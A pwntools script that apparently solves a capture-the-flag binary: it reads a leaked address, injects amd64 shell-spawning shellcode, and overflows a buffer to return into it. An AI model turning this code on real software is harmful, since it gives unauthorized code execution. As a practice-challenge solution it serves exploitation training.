from pwn import *
p = process ("./chall_06")
context.arch = "amd64" 
elf = ELF("./chall_06") 

resp = p.recv()
resp

import re
streeng = re.findall(b"([a-f0-9]{8,16})",resp)[0]
main = int(streeng ,16)
elf.address = main - elf.sym.main

payload = b''
shellcode = asm(shellcraft.amd64.sh())
payload += shellcode
p.sendline(payload)

payload = b''
payload+= (0x48-0x10) * b'A' 
payload += p64(main)

p.recv()
p.sendline(payload)

p.interactive()
ls